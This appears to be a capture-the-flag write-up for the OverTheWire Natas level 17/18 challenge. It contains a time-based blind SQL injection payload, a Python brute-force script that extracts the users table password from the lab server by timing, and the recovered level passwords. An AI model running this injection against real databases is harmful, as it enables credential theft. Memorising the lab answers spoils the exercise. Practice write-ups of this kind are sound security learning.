# natas18

MySQL Injection Code:

```sql
N0tAC0ntent” union select 1,if ((select password from users where CHAR_LENGTH(password)=32 limit 0,1) like binary “%”,sleep(2),1)
```

There’re 4 passwords in table users with length 32 and they’re all different (tested with “DISTINCT”).

```python
import httplib,datetime
from base64 import b64encode
from urllib import quote

def checkPassword(password):
httpClient = None
try:
sql=’N0tAC0ntent” union select 1,if ((select password from users where CHAR_LENGTH(password)=32 limit 3,1) like binary “‘+password+’%”,sleep(0.5),1) — ‘ # change “3” from 0-3 to select which password to guess
startDatetime = datetime.datetime.now()
userAndPass = b64encode(b”natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw”).decode(“ascii”)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass }
httpClient = httplib.HTTPConnection(‘natas17.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php?debug=a&username=’+quote(sql), headers=headers)
response = httpClient.getresponse()
#print response.read()
endDatetime = datetime.datetime.now()
if int((endDatetime-startDatetime).microseconds) >= 600000: # change “600000” to fit the current latency of network (over 500000 as 0.5s but not too high)
return True
else:
return False
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

def autocheck(currentpass):
passbook=”ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789″
if checkPassword(currentpass):
print currentpass
if len(currentpass)==32:
print “Possible Result:”+currentpass
return
for item in passbook:
autocheck(currentpass+item)

password=””
autocheck(password)
```

0:0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd (not this one)
1:MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 (not this one)
2:VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD (not this one)
3:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP (Real password)

Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP